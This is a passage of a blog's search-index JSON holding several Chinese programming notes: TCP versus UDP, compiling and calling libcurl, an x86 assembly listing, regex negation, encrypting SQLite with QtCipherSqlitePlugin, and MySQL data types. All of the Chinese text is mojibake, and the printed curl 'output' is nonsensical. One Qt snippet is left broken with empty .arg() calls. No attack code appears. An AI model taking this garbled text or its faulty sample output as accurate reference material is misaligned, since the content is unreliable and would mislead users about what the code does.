çš„é€šä¿¡è¿æ¥ï¼Œä½¿ä¸€å°è®¡ç®—æœºå‘å‡ºçš„å­—èŠ‚æµæ— å·®é”™åœ°å‘å¾€ç½‘ç»œä¸Šçš„å…¶ä»–è®¡ç®—æœºï¼Œå¯¹å¯é æ€§è¦æ±‚é«˜çš„æ•°æ®é€šä¿¡ç³»ç»Ÿå¾€å¾€ä½¿ç”¨TCPåè®®ä¼ è¾“æ•°æ®ã€‚ é¢å‘éè¿æ¥çš„UDPåè®® â€œé¢å‘éè¿æ¥â€œå°±æ˜¯åœ¨æ­£å¼é€šä¿¡å‰ä¸å¿…ä¸å¯¹æ–¹å…ˆå»ºç«‹è¿æ¥ï¼Œä¸ç®¡å¯¹æ–¹çŠ¶æ€å°±ç›´æ¥å‘é€ã€‚è¿™ä¸ç°åœ¨é£è¡Œçš„æ‰‹æœºçŸ­ä¿¡éå¸¸ç›¸ä¼¼ï¼šä½ åœ¨å‘çŸ­ä¿¡çš„æ—¶å€™ï¼Œåªéœ€è¦è¾“å…¥å¯¹æ–¹æ‰‹æœºå·å°±OKäº†ã€‚ UDPé€‚ç”¨äºä¸€æ¬¡åªä¼ é€å°‘é‡æ•°æ®ã€å¯¹å¯é æ€§è¦æ±‚ä¸é«˜çš„åº”ç”¨ç¯å¢ƒ UDPåè®®æ˜¯é¢å‘éè¿æ¥çš„åè®®ï¼Œæ²¡æœ‰å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ã€‚æ­£å› ä¸ºUDPåè®®æ²¡æœ‰è¿æ¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å®ƒçš„é€šä¿¡æ•ˆæœé«˜ï¼›ä½†ä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œå®ƒçš„å¯é æ€§ä¸å¦‚TCPåè®®é«˜ã€‚QQå°±ä½¿ç”¨UDPå‘æ¶ˆæ¯ï¼Œå› æ­¤æœ‰æ—¶ä¼šå‡ºç°æ”¶ä¸åˆ°æ¶ˆæ¯çš„æƒ…å†µã€‚ TCPåè®®ä¸UDPåè®®æ”¯æŒçš„åº”ç”¨åè®® TCPæ”¯æŒçš„åº”ç”¨åè®®ä¸»è¦æœ‰ï¼šTelnetã€FTPã€SMTP ç­‰ï¼› UDPæ”¯æŒçš„åº”ç”¨å±‚åè®®ä¸»è¦æœ‰ï¼š**NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰ã€SNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰ã€DNSï¼ˆä¸»åŸŸåç§°ç³»ç»Ÿï¼‰ã€TFTPï¼ˆé€šç”¨æ–‡ä»¶ä¼ è¾“åè®®ï¼‰**ç­‰ã€‚ TCPå’ŒUDPéƒ½æ˜¯ä½äºOSIæ¨¡å‹ä¸­çš„ä¼ è¾“å±‚ä¸­ã€‚ ğŸ“¢ TCPä¼˜ç‚¹ï¼šé¢å‘è¿æ¥çš„,å…·æœ‰å®æ—¶æ€§,å°±è±¡æ‰“ç”µè¯ä¸€æ ·,ä¸¤è€…å¿…é¡»å»ºç«‹è¿æ¥. å®ƒä¿è¯ä½ æ‰€ä¼ è¾“çš„ä¸œè¥¿æ˜¯å‡†ç¡®åˆ°è¾¾çš„,å¹¶ä¸”æ”¶æ–¹è¦ç»™ä½ ä¸€ä¸ªæ”¶åˆ°æˆ–æ²¡æœ‰\\æ”¶åˆ°çš„å›å¤,æ‰€ä»¥å®ƒå…·æœ‰å®‰å…¨æ€§çš„ç‰¹ç‚¹â€¦ ğŸ“¢ UDPä¼˜ç‚¹ï¼šé¢å‘æ— è¿æ¥çš„,å°±è±¡ç»™æŸäººå¯„ä¿¡ä¸€æ ·,å¯¹æ–¹ä¸éœ€è¦åœ¨é‚®å±€ç­‰ç€ä½ çš„ä¿¡åˆ°. æ‰€ä»¥è¯´,å®ƒæ²¡æœ‰ä¿éšœæ€§,ä¸èƒ½ç¡®ä¿ä½ ä¸€å®šèƒ½æ”¶åˆ°ä¿¡,ä¸è±¡TCPé‚£æ ·,ä½†æ˜¯ å®ƒæ¯”TCPå¥½çš„ä¸€ç‚¹,å°±æ˜¯é€Ÿåº¦å¿«,å› ä¸ºä»–ä¸éœ€è¦åŒæ–¹äº¤æµæ˜¯å¦æ”¶åˆ°,å¯¹å‘çš„ä¸œè¥¿æœ‰ä¸€ä¸ªç¡®è®¤çš„è¿‡ç¨‹.","tags":[{"name":"DNS","slug":"DNS","permalink":"https://hodlyounger.github.io/tags/DNS/"},{"name":"UDP","slug":"UDP","permalink":"https://hodlyounger.github.io/tags/UDP/"},{"name":"TCP","slug":"TCP","permalink":"https://hodlyounger.github.io/tags/TCP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/DNS","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘Curlä½¿ç”¨çš„ä¸€äº›demoï¼Œè®°å½•","date":"2023-10-27T01:24:02.365Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘Curlä½¿ç”¨æ•™ç¨‹/","text":"[toc] 1ã€ç¼–è¯‘åŠä½¿ç”¨ 1.1 ç¼–è¯‘ 1.1.1ä¸‹è½½ GitHub - curl/curl: A command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. libcurl offers a myriad of powerful features ç‚¹å‡»é“¾æ¥ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨git cloneåˆ°æœ¬åœ° 1git clone https://github.com/curl/curl.git 1.1.2 ç¼–è¯‘ æ–¹æ³•ä¸€ VSç¼–è¯‘å™¨ å¦‚æœéœ€è¦ä½¿ç”¨vsç¼–è¯‘ï¼Œé¦–å…ˆè¿è¡Œ project ç›®å½•ä¸‹çš„ generate.bat æ–‡ä»¶ã€‚ç„¶ååœ¨projects/Windwows ç›®å½•ä¸‹æ‰“å¼€å¯¹åº”çš„è§£å†³æ–¹æ¡ˆå³å¯ æ–¹æ³•äºŒ nmake åœ¨ä¸‹è½½ç›®å½• winbuild ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ README.md ï¼Œé‡Œè¾¹å‘Šè¯‰äº†æˆ‘ä»¬å¦‚ä½•ç¼–è¯‘è‡ªå·±éœ€è¦çš„åŒ…ï¼Œä»¥æˆ‘æœ¬äººä½¿ç”¨çš„ä¸ºä¾‹ã€‚ æ‰“å¼€å¯¹åº”ç‰ˆæœ¬çš„vså‘½ä»¤è¡Œå·¥å…· è¿›å…¥å¯¹åº”çš„ç¼–è¯‘ç›®å½• curl-src\\winbuildï¼Œæ¥ç€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°±å¥½ã€‚å…·ä½“çš„å‘½ä»¤å‚æ•°å¯ä»¥æŸ¥çœ‹winbuildç›®å½•ä¸‹çš„ä»‹ç»ï¼Œé€‰æ‹©è‡ªå·±éœ€è¦çš„ç¯å¢ƒå°±å¥½ã€‚ 1nmake /f Makefile.vc mode=dll vc=15 MACHINE=x86 æ‰§è¡Œä»¥åå°±èƒ½åœ¨æ ¹ç›®å½• build ä¸‹çœ‹åˆ°ç”Ÿæˆäº†å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè¿™æ—¶å€™å°±å¯ä»¥åœ¨é¡¹ç›®ä¸­ä½¿ç”¨äº†ã€‚æ³¨æ„ç”Ÿæˆç›®å½•ä¸‹æœ‰ binã€includeã€lib ä¸‰ä¸ªæ–‡ä»¶å¤¹ã€‚ 1.2 ä½¿ç”¨ å°†ç”Ÿæˆçš„æ–‡ä»¶æ‹–åŠ¨åˆ°é¡¹ç›®æ‰€åœ¨æ–‡ä»¶å¤¹ç›®å½•ä¸‹ï¼Œè¿™æ—¶å€™éœ€è¦åšä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼Œæ‰“å¼€é¡¹ç›®çš„å±æ€§é¡µé¢ï¼š 1.2.1 é¢„å¤„ç†å™¨ åœ¨é¢„å¤„ç†å™¨ä¸­æ·»åŠ ä»¥ä¸‹å­—æ®µï¼š 1;BUILDING_LIBCURL;HTTP_ONLY; 1.2.2 é™„åŠ åº“ åœ¨é“¾æ¥å™¨ä¸­é™„åŠ åº“ç›®å½•ï¼ŒæŠŠlibæ–‡ä»¶å¤¹æ·»åŠ åˆ°é™„åŠ åº“ç›®å½•å½“ä¸­ æ·»åŠ libæ–‡ä»¶ 1libcurl_a.lib;Ws2_32.lib;Wldap32.lib;winmm.lib;Crypt32.lib;Normaliz.lib;%(AdditionalDependencies) 1.3.3 ä½¿ç”¨ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;#include &quot;curl/curl.h&quot;string UriHelper::Encode(const string&amp; source)&#123; CURL* curl = curl_easy_init(); char* cres = curl_easy_escape(curl, source.c_str(), source.length()); string res(cres); curl_free(cres); curl_easy_cleanup(curl); return res;&#125;int main()&#123; std::cout &lt;&lt; &quot;Hello World!\\n&quot;; std::cout &lt;&lt; Encode(R&quot;(https://10.92.4.117:8443/tac /download/client/com.qianxin.trustagent.win.standard.exe.bm-3.1.1.4585/ TrustAgent_standard_3.1.1.4585.aef031d09[10.92.4.117@443].exe)&quot;) &lt;&lt; std::endl;&#125; è¾“å‡ºï¼šhttp0.0000000.0000000.000000www.baidu.com0.000000s0.000000ie%3Dutf-8 0.000000%3D8 %3Dbaidu%26wd%3D5.185438E-3164%B8%B48.694087E-3156%97%B65.190920E-3169%820.000000E5.12199E-31670.000000E%B1","tags":[{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"Curl","slug":"Curl","permalink":"https://hodlyounger.github.io/tags/Curl/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"HTTP","slug":"HTTP","permalink":"https://hodlyounger.github.io/tags/HTTP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€æ±‡ç¼–ã€‘æ— å‚æ— è¿”å›å‡½æ•°è°ƒç”¨","date":"2023-10-27T01:24:02.363Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘æ— å‚æ— è¿”å›å‡½æ•°è°ƒç”¨/","text":"æ¦‚è¿°ï¼šæ— å‚æ— è¿”å›å‡½æ•°çš„è°ƒç”¨æ±‡ç¼–åŠå †æ ˆè¯´æ˜ ä»£ç  æ±‡ç¼– 12345678910111213141516171819202122232425void Fun()&#123;00411780 push ebp 00411781 mov ebp,esp 00411783 sub esp,0C0h 00411789 push ebx 0041178A push esi 0041178B push edi 0041178C mov edi,ebp 0041178E xor ecx,ecx 00411790 mov eax,0CCCCCCCCh 00411795 rep stos dword ptr es:[edi] 00411797 mov ecx,offset _460A191B_SimpleFun@cpp (041C067h) 0041179C call @__CheckForDebuggerJustMyCode@4 (0411325h) &#125;004117A1 pop edi 004117A2 pop esi 004117A3 pop ebx 004117A4 add esp,0C0h 004117AA cmp ebp,esp 004117AC call __RTC_CheckEsp (0411249h) 004117B1 mov esp,ebp 004117B3 pop ebp 004117B4 ret å †æ ˆ","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€æ­£åˆ™è¡¨è¾¾å¼ã€‘åŒ¹é…ä¸ç­‰äº","date":"2023-10-27T01:24:02.359Z","path":"B_Code/æ­£åˆ™è¡¨è¾¾å¼/ã€æ­£åˆ™è¡¨è¾¾å¼ã€‘åŒ¹é…ä¸ç­‰äº/","text":"[^a]* è¡¨ç¤ºåŒ¹é…é™¤äº†aä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ [^abc]* è¡¨ç¤ºåŒ¹é…é™¤äº†aã€bã€cä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œæ³¨æ„è¿™é‡Œä¸æ˜¯abcå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯aã€bã€cä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½ä¸åŒ¹é… å½“æˆ‘ä»¬è¦ä¸åŒ¹é…æŸä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸­æ–‡è¯ç»„çš„æ—¶å€™ï¼Œå¯ä»¥è¿™æ ·ç”¨ ((?!å¤©ç©º).)* è¿™ä¸ªè¡¨ç¤ºåŒ¹é…å‡ºâ€™å¤©ç©ºâ€™ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ regex(?![0-9]+) åŒ¹é…ä¸æ˜¯regexï¼Œä½†åé¢ä¸æ˜¯æ•°å­—","tags":[{"name":"regex","slug":"regex","permalink":"https://hodlyounger.github.io/tags/regex/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"B-Code/æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"Qtæ’ä»¶â€”â€”ä½¿ç”¨ QtCipherSqlitePlugin å¯¹æ•°æ®åº“è¿›è¡ŒåŠ å¯†","date":"2023-10-27T01:24:02.358Z","path":"B_Code/æ•°æ®åº“/ã€SQLiteã€‘æ•°æ®åº“åŠ å¯†/","text":"å¼€æºåº“ä»‹ç» devbean/QtCipherSqlitePlugin: A Qt plugin for cipher SQLite. (github.com) è¯¥åŠ å¯†åº“æ˜¯åŸºäº SQLite å’Œ wxSQLite3 æºä»£ç å¼€å‘çš„çš„ä¸€ä¸ªåŠ å¯† SQLite çš„Qtæ’ä»¶ã€‚æ€»ç»“å°±æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ’ä»¶å¯¹ SQLite çš„æ•°æ®åº“è¿›è¡ŒåŠ å¯†ã€‚ å¼€å§‹ åœ¨å¼€å§‹ä¹‹å‰ï¼Œå¯ä»¥å»ä»“åº“çš„ wiki ç•Œé¢æ‰¾åˆ°ç›¸åº”çš„å¼€å§‹æ•™ç¨‹ï¼Œä»¥ä¸‹æ“ä½œå‚è€ƒ wiki ã€‚ æ‹‰å–è¯¥åº“åˆ°æœ¬åœ°åï¼Œæ‰“å¼€ QtCipherSqlitePlugin.proï¼Œå°±èƒ½çœ‹åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„å·¥ç¨‹ç»“æ„ã€‚ demo ç›®å½•æ˜¯ä¸€ä¸ªå¦‚ä½•ä½¿ç”¨è¯¥åŠ å¯†æ’ä»¶çš„å·¥ç¨‹ï¼Œæ¶‰åŠæ•°æ®åº“çš„åŠ å¯†ã€æ‰“å¼€ã€åˆ›å»ºç­‰ sqlitecipheræ˜¯æˆ‘ä»¬ç¼–è¯‘ dll çš„å·¥ç¨‹æ–‡ä»¶ ä¸º Qt çš„æ’ä»¶æµ‹è¯•å·¥ç¨‹ï¼Œé‡Œè¾¹æœ‰å…³äºè¯¥åŠ å¯†åº“çš„è¯¦ç»†ä½¿ç”¨æ–¹å¼ä»‹ç»ã€‚ ä¸è®ºæ˜¯ä½¿ç”¨ä¸Šè¿°æµ‹è¯•å·¥ç¨‹ä¸­çš„å“ªä¸ªï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥éƒ½éœ€è¦ç¼–è¯‘æ’ä»¶çš„åŠ¨æ€åº“å‡ºæ¥ä½¿ç”¨ã€‚ å•ç‹¬sqlitecipher.pro ä¸º sqlitecipher.pro è°ƒæ•´ Qt kits ï¼Œç¬”è€…çš„ç¯å¢ƒä¸º MSVC 2015 32 bit, Releaseæ¨¡å¼ å³å‡»é¡¹ç›®æ–‡ä»¶ï¼Œç‚¹å‡»éƒ¨ç½²å³å¯ åˆ°å·¥ç¨‹æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œå°±èƒ½çœ‹åˆ° build-sqlitecipher-Desktop_Qt_5_9_9_MSVC2015_32bit-Release çš„æ–‡ä»¶å¤¹ï¼Œåœ¨ .\\plugins\\sqldriversä¸‹å°±èƒ½çœ‹åˆ°ç”Ÿæˆçš„åŠ¨æ€åº“æ–‡ä»¶ï¼ŒåŠ¨æ€åº“ sqlitecipher.dll æ‹·è´è¯¥æ–‡ä»¶åˆ°ä½ çš„ Qt ç›®å½•ä¸‹ kits å¯¹åº”çš„æ–‡ä»¶å¤¹å½“ä¸­ã€‚å¦‚ç¬”è€…çš„ä¸º $Qtå®‰è£…ç›®å½•$\\5.9.9\\msvc2015\\plugins\\sqldrivers ä½¿ç”¨ åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±éœ€è¦æŸ¥çœ‹ä¸€ä¸‹åŠ¨æ€åº“æ˜¯å¦å¯ç”¨äº†ã€‚ä½¿ç”¨ Qt çš„ #include &lt;QSqlDatabase&gt;ä¸­çš„æ–¹æ³•å³å¯ï¼š 1qDebug() &lt;&lt; QSqlDatabase::drivers(); æ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œå¦‚æœåŠ è½½æˆåŠŸçš„è¯ï¼Œæˆ‘ä»¬ä¼šåœ¨ qDebug() çš„è¾“å‡ºä¸­çœ‹åˆ°ç›¸åº”çš„æ•°æ®åº“åã€‚ (&quot;QSQLITE&quot;, &quot;QMYSQL&quot;, &quot;QMYSQL3&quot;, &quot;QODBC&quot;, &quot;QODBC3&quot;, &quot;QPSQL&quot;, &quot;QPSQL7&quot;, &quot;SQLITECIPHER&quot;) ä»¥ä¸Šä»£ç ï¼Œåœ¨ demo æ‰€åœ¨å·¥ç¨‹ä¸­éƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„ä»£ç ï¼Œä¸ç”¨è¯»è€…ç¼–å†™ã€‚ å¦å¤–ï¼Œä½¿ç”¨ SQLITECIPHER æ•°æ®åº“ä¹Ÿå¯ä»¥æ‰“å¼€æ™®é€šæœªåŠ å¯†çš„ QSQLITE åˆ›å»ºçš„æ•°æ®åº“ã€‚ åŠ å¯† åŠ å¯†æ•°æ®åº“çš„ä½¿ç”¨ä¹Ÿç®€å•ï¼ŒåŒºåˆ«äºæ™®é€šæ•°æ®åº“çš„æ–¹å¼æ˜¯éœ€è¦è®¾ç½®è¿æ¥å±æ€§ã€‚ä»¥è¯¥å¼€æºåº“ä¸ºä¾‹ï¼Œå…¶ä¸»è¦é€šè¿‡ä¸‰ä¸ªè¿æ¥å±æ€§å»å†³å®šæ˜¯å¦è®¾ç½®å¯†ç ã€‚ä¸»è¦æ¶‰åŠåˆ°çš„å…³é”®å­—ä¸ºä»¥ä¸‹ä¸‰ä¸ªï¼š Added by QtCipherSqlitePlugin QSQLITE_CREATE_KEY QSQLITE_UPDATE_KEY QSQLITE_REMOVE_KEY è¿˜æœ‰å…¶ä»–å‡ ä¸ªç»§æ‰¿è‡ª SqlitePlugin çš„å…³é”®å­—ï¼Œç”¨æ³•ä¸ SqlitePlugin æ‰“å¼€æ•°æ®åº“è®¾ç½®ä¸€è‡´ã€‚ Provided by Qt SqlitePlugin QSQLITE_BUSY_TIMEOUT QSQLITE_OPEN_READONLY QSQLITE_OPEN_URI QSQLITE_ENABLE_SHARED_CACHE ä»¥ä¸‹ä»£ç æ¼”ç¤ºä¸‰ç§å…³é”®å­—çš„ç”¨æ³•ã€‚ åˆ›å»ºæ•°æ®åº“å¯†ç  QSQLITE_CREATE_KEY å¦‚æœè¾“å‡ºä¸­æœ‰ SQLITECIPHER çš„åå­—ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œæ’ä»¶æ²¡æœ‰é—®é¢˜ï¼ ä¸ºæ²¡æœ‰åŠ å¯†çš„æ•°æ®åº“å¢åŠ å¯†ç  Qt é»˜è®¤æä¾›çš„ SQLite æ’ä»¶æ˜¯æ²¡æœ‰åŠ å¯†åŠŸèƒ½çš„ã€‚æ–°ç‰ˆæœ¬çš„ QtCipherSqlitePlugin æ”¯æŒä¸ºåŸæœ¬æ²¡æœ‰åŠ å¯†çš„æ•°æ®åº“å¢åŠ å¯†ç ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š C++ 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_CREATE_KEY&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; ä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬ä½¿ç”¨ test.db æ•°æ®åº“ï¼Œå°†å¯†ç è®¾ç½®ä¸º testï¼ŒåŒæ—¶æŒ‡å®šè¿æ¥é€‰é¡¹ä¸º QSQLITE_CREATE_KEY ã€‚æ­¤æ—¶ï¼Œè°ƒç”¨ open() å‡½æ•°ä¹‹åï¼ŒQtCipherSqlitePlugin å°†ä½¿ç”¨æ”¹å¯†ç ä¸ºè¿™ä¸ªæ•°æ®åº“è¿›è¡ŒåŠ å¯†ã€‚ åˆ é™¤æ•°æ®åº“å¯†ç  QSQLITE_REMOVE_KEY QtCipherSqlitePlugin å¯ä»¥åˆ é™¤æ•°æ®åº“å¯†ç ï¼Œæ­¤æ—¶éœ€è¦æä¾›åŸå¯†ç ï¼Œå¹¶ä½¿ç”¨è¿æ¥é€‰é¡¹ QSQLITE_REMOVE_KEY ï¼Œå¦‚ä¸‹ï¼š 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_REMOVE_KEY&quot;);if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; æ›´æ–°æ•°æ®åº“å¯†ç  QSQLITE_UPDATE_KEY QtCipherSqlitePlugin å¯ä»¥æ›´æ–°æ•°æ®åº“åŸæœ‰å¯†ç ï¼Œéœ€è¦è®¾ç½®åŸå¯†ç ï¼Œå¹¶ä¸”ä½¿ç”¨è¿æ¥é€‰é¡¹ QSQLITE_UPDATE_KEY è®¾ç½®æ–°å¯†ç ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_UPDATE_KEY=newtest&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; å¦‚æœåŸå¯†ç ä¸æ­£ç¡®ï¼ŒQtCipherSqlitePlugin ä¼šç›´æ¥è¿”å›é”™è¯¯ã€‚ å¦‚æœæ–°å¯†ç è®¾ç½®ä¸ºç©ºï¼Œä¾‹å¦‚ QSQLITE_UPDATE_KEY= ï¼Œåˆ™ä½œç”¨ç­‰åŒäºåˆ é™¤å¯†ç ã€‚åŒæ ·çš„ï¼Œè®¾ç½® setConnectOptions(&quot;&quot;) ä¹Ÿç›¸å½“äºæ¸…é™¤è®¾ç½®çš„å±æ€§ã€‚ è¡¥å…… ä»¥ä¸‹ä»£ç æ˜¯æˆ‘ä¸ªäººæƒ³å†™ä¸€ä¸ªé€šç”¨çš„è®¾ç½®å±æ€§çš„æ¥å£ï¼Œåæ¥æ€è€ƒä¸€ç•ªä¸å¤ªç°å®ä»¥ç¤ºä¼—å¤šè¯»è€…ï¼Œä¸è¦é‡è¹ˆè¦†è¾™ã€‚ 1234567891011121314151617bool setDBConfig(QSqlDatabase* dbconn, QMap&lt;ENUM_SQLKEY, QString&gt; qMapCfg)&#123; for (auto it : qMapCfg.toStdMap()) &#123; if (it.first &lt;= QSQLITE_REMOVE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(GETOBJNAME(it.first)); &#125; else if (it.first == QSQLITE_UPDATE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(QString(&quot;%1=%2&quot;).arg().arg()); &#125; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"åŠ å¯†","slug":"åŠ å¯†","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86/"},{"name":"Database","slug":"Database","permalink":"https://hodlyounger.github.io/tags/Database/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ•°æ®åº“","slug":"B-Code/æ•°æ®åº“","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"ã€MYSQLã€‘æ•°æ®ç±»å‹","date":"2023-10-27T01:24:02.354Z","path":"B_Code/æ•°æ®åº“/MYSQL/ã€MYSQLã€‘æ•°æ®ç±»å‹/","text":"MYSQL æ•°æ®ç±»å‹æ•´ç† MySQL ä¸­å®šä¹‰æ•°æ®å­—æ®µçš„ç±»å‹å¯¹ä½ æ•°æ®åº“çš„ä¼˜åŒ–æ˜¯éå¸¸é‡è¦çš„ã€‚ MySQL æ”¯æŒå¤šç§ç±»å‹ï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼šæ•°å€¼ã€æ—¥æœŸ/æ—¶é—´å’Œå­—ç¬¦ä¸²(å­—ç¬¦)ç±»å‹ã€‚ æ•°å€¼ç±»å‹ MySQL æ”¯æŒæ‰€æœ‰æ ‡å‡† SQL æ•°å€¼æ•°æ®ç±»å‹ã€‚ è¿™äº›ç±»å‹åŒ…æ‹¬ä¸¥æ ¼æ•°å€¼æ•°æ®ç±»å‹(INTEGERã€SMALLINTã€DECIMAL å’Œ NUMERIC)ï¼Œä»¥åŠè¿‘ä¼¼æ•°å€¼æ•°æ®ç±»å‹(FLOATã€REAL å’Œ DOUBLE PRECISION)ã€‚ å…³é”®å­—INTæ˜¯INTEGERçš„åŒä¹‰è¯ï¼Œå…³é”®å­—DECæ˜¯DECIMALçš„åŒä¹‰è¯ã€‚ BITæ•°æ®ç±»å‹ä¿å­˜ä½å­—æ®µå€¼ï¼Œå¹¶ä¸”æ”¯æŒ MyISAMã€MEMORYã€InnoDB å’Œ BDBè¡¨ã€‚ ä½œä¸º SQL æ ‡å‡†çš„æ‰©å±•ï¼ŒMySQL ä¹Ÿæ”¯æŒæ•´æ•°ç±»å‹ TINYINTã€MEDIUMINT å’Œ BIGINTã€‚ä¸‹é¢çš„è¡¨æ˜¾ç¤ºäº†éœ€è¦çš„æ¯ä¸ªæ•´æ•°ç±»å‹çš„å­˜å‚¨å’ŒèŒƒå›´ã€‚ ç±»å‹ å¤§å° èŒƒå›´ï¼ˆæœ‰ç¬¦å·ï¼‰ èŒƒå›´ï¼ˆæ— ç¬¦å·ï¼‰ ç”¨é€” TINYINT 1 Bytes (-128ï¼Œ127) (0ï¼Œ255) å°æ•´æ•°å€¼ SMALLINT 2 Bytes (-32 768ï¼Œ32 767) (0ï¼Œ65 535) å¤§æ•´æ•°å€¼ MEDIUMINT 3 Bytes (-8 388 608ï¼Œ8 388 607) (0ï¼Œ16 777 215) å¤§æ•´æ•°å€¼ INTæˆ–INTEGER 4 Bytes (-2 147 483 648ï¼Œ2 147 483 647) (0ï¼Œ4 294 967 295) å¤§æ•´æ•°å€¼ BIGINT 8 Bytes (-9,223,372,036,854,775,808ï¼Œ9 223 372 036 854 775 807) (0ï¼Œ18 446 744 073 709 551 615) æå¤§æ•´æ•°å€¼ FLOAT 4 Bytes (-3.402 823 466 E+38ï¼Œ-1.175 494 351 E-38)ï¼Œ0ï¼Œ(1.175 494 351 